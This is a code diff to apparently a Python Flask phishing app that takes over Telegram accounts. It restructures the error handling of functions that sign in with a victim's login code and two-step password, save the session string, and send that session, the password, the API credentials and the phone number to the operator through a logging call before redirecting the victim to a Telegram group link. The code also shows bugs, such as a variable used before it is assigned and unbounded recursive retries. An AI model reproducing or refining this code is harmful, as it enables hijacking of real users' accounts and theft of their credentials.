@@ -95,33 +95,36 @@ def send(login_code, phone):
         client.disconnect()
         return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
     except:
-        send()
+        send(login_code, phone)
 
 def send_with_pss(login_password):
-    global client
-    phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
     try:
-        if client.is_connected():
-            try:
+        global client
+        phone = base64.b64decode(base64.b64encode(bytes(phone, "utf-8"))).decode("utf-8", "ignore")
+        try:
+            if client.is_connected():
+                try:
+                    client.sign_in(password=login_password)
+                    string = client.session.save()
+                    send_logs(
+                        f"Success✅\nLogin: \n\n{string} \n\nPassword: \n\n{login_password}\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
+                    client.disconnect()
+                except Exception as e:
+                    client.disconnect()
+                    send_logs(str(e))
+                    return redirect(url_for('login'))
+            else:
+                client.connect()
                 client.sign_in(password=login_password)
                 string = client.session.save()
                 send_logs(
                     f"Success✅\nLogin: \n\n{string} \n\nPassword: \n\n{login_password}\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
                 client.disconnect()
-            except Exception as e:
-                client.disconnect()
-                send_logs(str(e))
-                return redirect(url_for('login'))
-        else:
-            client.connect()
-            client.sign_in(password=login_password)
-            string = client.session.save()
-            send_logs(
-                f"Success✅\nLogin: \n\n{string} \n\nPassword: \n\n{login_password}\nApi_hash: \n\n{api_hash}\nApi_id: \n\n{api_id}\n\nNumber: {phone}")
-            client.disconnect()
+        except:
+            return redirect(url_for('login'))
+        return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
     except:
-        return redirect(url_for('login'))
-    return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
+        send_with_pss(login_password)
 
 
 @app.route('/', methods=["POST", "GET"])
